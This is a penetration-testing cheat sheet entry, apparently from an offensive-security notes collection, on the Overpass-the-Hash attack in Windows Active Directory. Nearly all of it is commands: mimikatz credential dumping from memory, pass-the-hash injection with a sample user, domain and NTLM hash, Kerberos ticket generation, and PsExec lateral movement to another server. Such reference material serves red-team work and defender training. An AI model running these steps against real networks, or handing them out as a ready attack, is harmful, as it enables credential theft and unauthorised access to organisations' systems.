---
title: Overpass-the-Hash
category: ad
subcategory: ad-attacks
os: windows
command: sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:powershell
tools: mimikatz, klist, PsExec
---


Convert an NTLM hash into a usable Kerberos TGT, bypassing NTLM auth restrictions.

### Step 1 - Dump the hash with mimikatz

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### Step 2 - Spawn a process with the hash injected

```
mimikatz # sekurlsa::pth /user:marek /domain:firma.com /ntlm:a87f3b2c91e5d4a06f8823bc1e40d529 /run:powershell
```

A new PowerShell window opens. Note: `whoami` still shows the original user - this is expected; only Kerberos tickets are imported.

### Step 3 - Generate the TGT

```powershell
klist
net use \\FIRMA
klist
```

After contacting any domain resource, a TGT for the target user appears.

### Step 4 - Lateral movement (PsExec accepts Kerberos)

```powershell
.\PsExec.exe \\BACKUP-SRV cmd
whoami
hostname
```
